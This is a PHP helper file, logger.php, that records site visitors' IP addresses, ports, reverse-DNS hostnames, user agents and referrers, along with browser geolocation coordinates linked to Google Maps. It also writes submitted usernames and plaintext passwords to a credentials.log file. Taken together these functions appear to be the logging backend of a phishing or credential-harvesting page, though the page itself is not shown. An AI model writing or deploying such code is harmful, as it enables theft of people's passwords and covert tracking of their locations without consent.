<?php
/**
 * logger.php
 * 
 * Provides helper functions for:
 *  - Logging environment details
 *  - Logging user agent info
 *  - Logging geolocation
 *  - Logging credentials
 */

require_once __DIR__ . '/config.php';

/**
 * Ensure the logs directory exists.
 */
if (!is_dir(LOG_DIR)) {
    mkdir(LOG_DIR, 0777, true);
}

/**
 * Generic function: append message to a file, truncate if too large.
 */
function logToFile(string $filePath, string $message)
{
    if (file_exists($filePath) && filesize($filePath) > LOG_MAX_SIZE) {
        file_put_contents($filePath, "");
    }
    file_put_contents($filePath, $message, FILE_APPEND);
}

/**
 * Log environment details to environment.log
 */
function logEnvironment()
{
    $date   = date("Y-m-d H:i:s");
    $ip     = getClientIP();
    $port   = $_SERVER['REMOTE_PORT'] ?? 'UNKNOWN';
    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
    $method = $_SERVER['REQUEST_METHOD'] ?? 'UNKNOWN';
    $host   = $_SERVER['REMOTE_HOST'] ?? 'UNKNOWN';
    $ref    = $_SERVER['HTTP_REFERER'] ?? 'UNKNOWN';
    $query  = $_SERVER['QUERY_STRING'] ?? '';

    // Attempt reverse DNS if REMOTE_HOST is unknown
    if ($host === 'UNKNOWN' && $ip !== 'UNKNOWN') {
        $rev = @gethostbyaddr($ip);
        if ($rev) $host = $rev;
    }

    $logEntry = sprintf(
        "[%s] IP: %s | PORT: %s | HOST: %s | METHOD: %s | UA: %s | REF: %s | QUERY: %s\n",
        $date,
        $ip,
        $port,
        $host,
        $method,
        $ua,
        $ref,
        $query
    );
    logToFile(LOG_FILE_ENV, $logEntry);
}

/**
 * Log user-agent info to user_agents.log
 */
function logUserAgent()
{
    $date   = date("Y-m-d H:i:s");
    $ip     = getClientIP();
    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
    $ref    = $_SERVER['HTTP_REFERER'] ?? 'UNKNOWN';
    $script = $_SERVER['SCRIPT_NAME'] ?? 'UNKNOWN';
    $query  = $_SERVER['QUERY_STRING'] ?? '';

    $logEntry = sprintf(
        "[%s] IP: %s | UA: %s | REF: %s | SCRIPT: %s | QUERY: %s\n",
        $date,
        $ip,
        $ua,
        $ref,
        $script,
        $query
    );
    logToFile(LOG_FILE_UA, $logEntry);
}

/**
 * Log geolocation data to geolocation.log
 */
function logGeolocation(float $lat, float $lon)
{
    $date = date("Y-m-d H:i:s");
    $mapsURL = "https://maps.google.com/maps?q={$lat},{$lon}";

    $logEntry = sprintf(
        "[%s] Lat: %f | Lon: %f | Maps: %s\n",
        $date,
        $lat,
        $lon,
        $mapsURL
    );
    logToFile(LOG_FILE_GEO, $logEntry);
}

/**
 * Log credentials to credentials.log
 */
function logCredentials(string $username, string $password)
{
    $date = date("Y-m-d H:i:s");
    $ip   = getClientIP();
    $ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';

    $logEntry = sprintf(
        "[%s] IP: %s | UA: %s | USER: %s | PASS: %s\n",
        $date,
        $ip,
        $ua,
        $username,
        $password
    );
    logToFile(LOG_FILE_CREDS, $logEntry);
}

/**
 * Obtain the client IP considering proxy headers.
 */
function getClientIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($parts[0]);
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    }
    return 'UNKNOWN';
}
